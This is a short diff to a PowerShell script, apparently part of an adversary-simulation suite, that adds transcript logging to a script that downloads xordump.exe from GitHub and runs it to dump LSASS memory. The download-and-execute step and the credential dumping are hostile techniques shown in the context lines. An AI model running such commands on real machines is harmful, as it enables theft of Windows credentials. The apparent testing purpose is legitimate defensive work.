@@ -5,6 +5,7 @@
     Dump lsass with xordmp.exe (Dump LSASS.exe using imported Microsoft DLLs)
 #>
 
+Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
 
 # Download and execute xordump.exe
 $url = "https://github.com/audibleblink/xordump/releases/download/v0.0.2/xordump.exe"
@@ -29,3 +30,5 @@ try {
 catch {
     Write-Error $_
 }
+
+Stop-Transcript
